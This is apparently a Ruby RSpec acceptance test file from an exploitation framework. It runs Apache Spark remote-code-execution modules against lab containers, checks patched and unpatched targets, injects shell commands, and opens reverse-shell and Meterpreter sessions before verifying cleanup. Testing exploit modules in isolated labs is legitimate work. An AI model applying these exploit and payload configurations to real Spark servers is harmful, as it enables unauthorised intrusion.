require 'acceptance_spec_helper'
require 'net/http'
require 'shellwords'
require 'timeout'

profile = ENV.fetch('SPARK_TARGET_PROFILE', 'ui')
raise ArgumentError, "Unknown Spark profile: #{profile}" unless %w[ui rest].include?(profile)

RSpec.describe 'Genuine Apache Spark execution targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  let(:spark_profile) { profile }

  before(:all) do
    argv = ['python3', '-B', 'test/module_targets/spark/native_probe.py']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-spark-result.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-spark-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    expect(stderr).to eq('')
    expect(JSON.parse(stdout).fetch('status')).to eq('passed')
  end

  after do
    expect(console_command('sessions -K')).not_to include('[-]')
    expect(console_command('jobs -K')).not_to include('[-]')
  end

  if profile == 'ui'
    {
      'affected' => 'Successfully tested command injection.',
      'legacy' => 'Successfully tested command injection.',
      'fixed' => 'Failed to test command injection.',
      'disabled' => 'Target did not respond with a 403 response.'
    }.each do |service, reason|
      it "checks the genuine #{service} ACL boundary twice" do
        2.times { expect(invoke(service, {}, action: 'check')).to include(reason) }
      end
    end

    it 'checks real injection through an authenticated prefix twice' do
      2.times { expect(invoke('gateway', {}, action: 'check')).to include('Successfully tested command injection.') }
    end

    [nil, 'wrong-password'].each do |password|
      it "rejects #{password || 'absent credentials'} at the genuine UI gateway twice" do
        values = password ? { 'HttpPassword' => password } : { 'HttpUsername' => '', 'HttpPassword' => '' }
        2.times { expect(invoke('gateway', values, action: 'check')).to include('Target did not respond with a 403 response.') }
      end
    end

    it 'does not identify unrelated real Apache as vulnerable twice' do
      2.times { expect(invoke('unrelated', {}, action: 'check')).to include('Target did not respond with a 403 response.') }
    end

    it 'returns an unknown check for the owned closed endpoint twice' do
      2.times { expect(invoke('disabled', { 'RPORT' => 6066 }, action: 'check', allow_errors: true)).to include('Did not receive a response from target.') }
    end

    {
      'affected' => ['affected', {}],
      'legacy' => ['legacy', {}],
      'authenticated prefix' => ['gateway', {}],
      'nonexistent route covered by the real authorization filter' => ['affected', { 'TARGETURI' => '/module-target-missing/' }]
    }.each do |label, (service, options)|
      it "executes exact command bytes on #{label} twice and restores files" do
        2.times do |iteration|
          with_proof(backend(service), "command-#{iteration}") do |path|
            stem = "Module target Spark >>> $HOME; literal spaces #{iteration}"
            value = stem + "\n"
            command = "printf '%s\\n' '#{stem}' > #{path}"
            output = invoke(service, {
              'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command,
              'AutoCheck' => false, 'DisablePayloadHandler' => true, 'WfsDelay' => 0
            }.merge(options))
            expect(output).not_to include('session opened')
            wait_for_proof(backend(service), path, value)
          end
        end
      end
    end

    it 'opens and uses the default Python command shell twice' do
      sessions_twice('affected', 'cmd/unix/reverse_python', 'TARGET' => 0, 'AutoCheck' => true)
    end

    it 'opens and uses Linux x64 shell sessions through printf twice' do
      sessions_twice('affected', 'linux/x64/shell_reverse_tcp', 'TARGET' => 1, 'CMDSTAGER::FLAVOR' => 'printf')
    end

    it 'opens and uses Linux x64 Meterpreter through curl twice' do
      sessions_twice('affected', 'linux/x64/meterpreter/reverse_tcp', 'TARGET' => 1, 'CMDSTAGER::FLAVOR' => 'curl')
    end

    it 'executes a Linux x86 command through the printf stager twice' do
      2.times do |iteration|
        with_proof('affected', "x86-#{iteration}") do |path|
          invoke('affected', {
            'TARGET' => 1, 'PAYLOAD' => 'linux/x86/exec', 'CMD' => "/usr/bin/touch #{path}",
            'CMDSTAGER::FLAVOR' => 'printf', 'AutoCheck' => false, 'DisablePayloadHandler' => true, 'WfsDelay' => 0
          })
          wait_for_proof('affected', path, '')
        end
      end
    end

    it 'does not execute forced commands on patched or ACL-disabled genuine targets twice' do
      %w[fixed disabled].each do |service|
        2.times do |iteration|
          with_proof(service, "negative-#{iteration}") do |path|
            output = invoke(service, {
              'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "/usr/bin/touch #{path}",
              'AutoCheck' => false, 'DisablePayloadHandler' => true, 'WfsDelay' => 0
            }, allow_errors: true)
            expect(output).not_to match(/session \d+ opened/)
            target_exec(service, 'test', '!', '-e', path)
          end
        end
      end
    end
  else
    %w[affected gateway].each do |service|
      it "detects the real #{service} REST API twice" do
        2.times { expect(invoke(service, {}, action: 'check')).to include('The target service was detected') }
      end
    end

    [nil, 'wrong-password'].each do |password|
      it "does not submit with #{password || 'absent credentials'} at the REST gateway twice" do
        options = password ? { 'HttpPassword' => password } : { 'HttpUsername' => '', 'HttpPassword' => '' }
        no_rest_execution('gateway', options)
      end
    end

    it 'does not submit to the genuine disabled REST endpoint twice' do
      no_rest_execution('disabled', {})
    end

    it 'does not submit to unrelated real Apache twice' do
      no_rest_execution('unrelated', {})
    end

    it 'does not execute with a nonexistent REST API base twice' do
      no_rest_execution('affected', 'TARGETURI' => '/module-target-missing/')
    end

    it 'opens and uses default Java Meterpreter sessions twice through standalone drivers' do
      sessions_twice('affected', 'java/meterpreter/reverse_tcp', {})
    end

    it 'opens and uses Java shell sessions twice through an authenticated REST prefix' do
      sessions_twice('gateway', 'java/shell/reverse_tcp', {})
    end
  end

  def backend(service)
    return 'worker' if spark_profile == 'rest'

    service == 'gateway' ? 'affected' : service
  end

  def invoke(service, options = {}, action: 'run -z', allow_errors: false)
    defaults = { 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true }
    defaults['TARGETURI'] = '/' if spark_profile == 'ui'
    if service == 'gateway'
      defaults.merge!('TARGETURI' => "/spark-#{spark_profile}/", 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password')
    end
    fullname = spark_profile == 'ui' ? 'exploit/linux/http/apache_spark_rce_cve_2022_33891' : 'exploit/linux/http/spark_unauth_rce'
    output = run_target_module(fullname, service, defaults.merge(options), action: action, allow_errors: allow_errors, command_timeout: 90)
    unknown_options = output.scan(/Unknown datastore option:\s+(\w+)/).flatten
    explicit_uri = defaults.merge(options)['TARGETURI']
    expected_unknown = spark_profile == 'rest' && explicit_uri && explicit_uri != '/' ? ['TARGETURI'] : []
    expect(unknown_options).to eq(expected_unknown), output
    append('spark-option-contract', service: service, action: action, unknown_options: unknown_options)
    expect(output).not_to match(/uninitialized constant|NoMethodError|NameError|TypeError|ArgumentError|RuntimeError/)
    output
  end

  def wait_until(&block)
    Timeout.timeout(20) { wait_for_expect(1000, 0.1, &block) }
  end

  def wait_for_proof(service, path, value)
    wait_until do
      expect(target_exec(service, 'sh', '-c', "if test -f #{Shellwords.escape(path)}; then stat -c '%u:%g' #{Shellwords.escape(path)}; fi").strip).to eq('1500:1500')
      expect(target_exec(service, 'cat', path)).to eq(value)
    end
  end

  def with_proof(service, label)
    before = state(service)
    path = "/tmp/module-target-spark-#{label}"
    target_exec(service, 'test', '!', '-e', path)
    yield path
    target_exec(service, 'rm', '-f', '--', path)
    wait_until { expect(state(service)).to eq(before) }
    append('spark-restoration', service: service, before: before, after: state(service))
  ensure
    target_exec(service, 'rm', '-f', '--', path) if path
  end

  def sessions_twice(service, payload, options)
    actor = backend(service)
    2.times do |iteration|
      with_proof(actor, "session-#{iteration}") do |path|
        before = state(actor)
        original_sessions = session_ids
        output_offset = console.all_data.bytesize
        values = {
          'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444,
          'SRVHOST' => listener_host, 'SRVPORT' => 8082, 'DisablePayloadHandler' => false
        }
        values.merge!('AutoCheck' => false, 'WfsDelay' => 10) if spark_profile == 'ui'
        output = invoke(service, values.merge(options))
        expect(output).not_to match(/Exploit (?:aborted|failed)|Payload failed/)
        identifier = nil
        wait_until do
          console_command('sessions -l')
          created = session_ids - original_sessions
          fresh = console.all_data.byteslice(output_offset..)
          opened = fresh.scan(/(?:Command shell|Meterpreter) session (\d+) opened/).flatten.map(&:to_i)
          ready = created & opened
          expect(ready.length).to eq(1), output
          identifier = ready.fetch(0)
        end
        meterpreter = payload.include?('meterpreter')
        command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "id; printf 'MODULE_TARGET_SPARK_REMOTE_PID=%s\\n' $$; /usr/bin/touch #{path}"
        proof = console_command("sessions -i #{identifier} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
        expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
        expect(proof).to include('uid=1500(spark)') unless meterpreter
        wait_for_proof(actor, path, '')
        remote_pid = nil
        if meterpreter && payload.start_with?('linux/')
          pid_response = console_command("sessions -i #{identifier} -C getpid")
          remote_pid = pid_response[/Current pid:\s*(\d+)/i, 1]
          expect(remote_pid).not_to be_nil, pid_response
        elsif !meterpreter
          remote_pid = proof[/MODULE_TARGET_SPARK_REMOTE_PID=(\d+)/, 1]
          expect(remote_pid).not_to be_nil, proof
        end
        target_exec(actor, 'test', '-d', "/proc/#{remote_pid}") if remote_pid
        live = state(actor)
        expect(live.fetch(:java) - before.fetch(:java)).not_to be_empty if payload.start_with?('java/')
        append('spark-session-proof', service: service, payload: payload, session_id: identifier, output: output, proof: proof, remote_pid: remote_pid, before: before, live: live)
        expect(console_command('sessions -K')).not_to include('[-]')
        expect(console_command('jobs -K')).not_to include('[-]')
        wait_until { expect(target_exec(actor, 'sh', '-c', "if test -d /proc/#{remote_pid}; then printf alive; fi")).to eq('') } if remote_pid
        prove_callback_removed
        prove_http_resources_removed if spark_profile == 'rest' || options['CMDSTAGER::FLAVOR'] == 'curl'
      end
    end
  end

  def no_rest_execution(service, options)
    2.times do
      before = master_state
      output = invoke(service, {
        'PAYLOAD' => 'java/meterpreter/reverse_tcp', 'LHOST' => listener_host,
        'SRVHOST' => listener_host, 'SRVPORT' => 8082, 'DisablePayloadHandler' => true,
        'HTTPDELAY' => 1
      }.merge(options), allow_errors: true)
      expect(output).not_to match(/session \d+ opened/)
      wait_until { expect(console_command('jobs -l')).to include('No active jobs') }
      expect(master_state).to eq(before)
      expect(console_command('sessions -l')).to include('No active sessions')
      prove_http_resources_removed
    end
  end

  def session_ids
    code = 'puts "MODULE_TARGET_SPARK_SESSIONS:"+JSON.generate(framework.sessions.keys)'
    output = console_command("irb -e #{code.inspect}")
    match = output[/^MODULE_TARGET_SPARK_SESSIONS:(\[.*\])\r?$/, 1]
    expect(match).not_to be_nil, output
    JSON.parse(match)
  end

  def master_state
    endpoint = target_endpoint('affected')
    # The UI is independently published even when module_endpoints selects REST.
    port, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'port', 'affected', '8080')
    expect(status.success?).to be(true), error
    native = Net::HTTP.new(endpoint.fetch('host'), Integer(port.strip.split(':').last), nil)
    native.open_timeout = native.read_timeout = 5
    response = native.get('/json/')
    expect(response.code).to eq('200')
    data = JSON.parse(response.body)
    data.values_at('activeapps', 'activedrivers', 'completeddrivers')
  end

  def state(service)
    processes = 'for path in /proc/[0-9]*/comm; do read -r name < "$path" || continue; if [ "$name" = java ]; then printf "%s " "$path"; tr "\\000" " " < "${path%/comm}/cmdline"; printf "\\n"; fi; done'
    {
      temporary: target_exec(service, 'find', '/tmp', '-type', 'f', '-printf', '%p\n').lines.sort,
      work: target_exec(service, 'find', '/opt/spark/work', '-type', 'f', '-printf', '%p\n').lines.sort,
      java: target_exec(service, 'sh', '-c', processes).lines.sort
    }
  end

  def prove_http_resources_removed
    code = 'puts "MODULE_TARGET_SPARK_POOL:"+JSON.generate(Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server).select { |server| server.listen_port==8082 }.map { |server| { resources:server.resources.keys, references:server.instance_variable_get(:@_references) } })'
    output = console_command("irb -e #{code.inspect}")
    rows = output[/^MODULE_TARGET_SPARK_POOL:(\[.*\])\r?$/, 1]
    expect(rows).not_to be_nil, output
    pool = JSON.parse(rows)
    expect(pool.flat_map { |server| server.fetch('resources') }).to eq([])
    probe = 'require "net/http"; require "json"; begin; uri=URI(ARGV[0]); response=Net::HTTP.start(uri.host,uri.port,open_timeout:2,read_timeout:2) { |http| http.get(uri) }; puts JSON.generate(code:response.code.to_i,body:response.body); rescue Errno::ECONNREFUSED; puts JSON.generate(state:"refused"); end'
    response = JSON.parse(target_exec('framework', 'ruby', '-e', probe, "http://#{listener_host}:8082/"))
    expect(response['state'] == 'refused' || response['code'] == 404).to be(true), response.inspect
    append('spark-http-resources', pool: pool, response: response)
  end

  def prove_callback_removed
    script = 'require "json"; rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && row[1].split(":").last.to_i(16)==4444 })'
    wait_until { expect(JSON.parse(target_exec('framework', 'ruby', '-e', script))).to eq([]) }
  end

  def append(name, data)
    File.open(File.join(target_runtime.fetch('artifacts'), "#{name}.jsonl"), 'a') { |log| log.puts(JSON.generate(data)) }
  end
end

# Match the family-local prepend used by Solr so super reaches the shared
# implementation. A returned IRB marker also drains stale asynchronous prompts.
module SparkTargetConsoleControls
  def console_command(command, timeout: 40)
    raise ArgumentError, 'A console command must occupy one input line' if command.match?(/[\r\n]/)
    raise Acceptance::ChildProcessTimeoutError, 'Console failed; diagnostic stopped' if @spark_console_broken

    Timeout.timeout(timeout) do
      output = super
      @spark_console_sequence = (@spark_console_sequence || 0) + 1
      marker = "MODULE_TARGET_SPARK_ACK_#{Process.pid}_#{@spark_console_sequence}"
      console.sendline("irb -e #{"puts #{marker.inspect}".inspect}")
      acknowledged = console.recvuntil(/^#{Regexp.escape(marker)}\r?\n/, timeout: timeout)
      raise Acceptance::ChildProcessRecvError, 'Console ended before command acknowledgement' unless acknowledged

      prompt = console.recvuntil(Acceptance::Console.prompt, timeout: timeout)
      raise Acceptance::ChildProcessRecvError, 'Console ended after command acknowledgement' unless prompt

      output + acknowledged + prompt
    end
  rescue Timeout::Error, Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError, EOFError, Errno::EPIPE
    @spark_console_broken = true
    RSpec.world.wants_to_quit = true
    raise
  end
end

group = RSpec.world.example_groups.find { |item| item.description == 'Genuine Apache Spark execution targets' }
raise 'Spark target group is missing' unless group

group.prepend(SparkTargetConsoleControls)
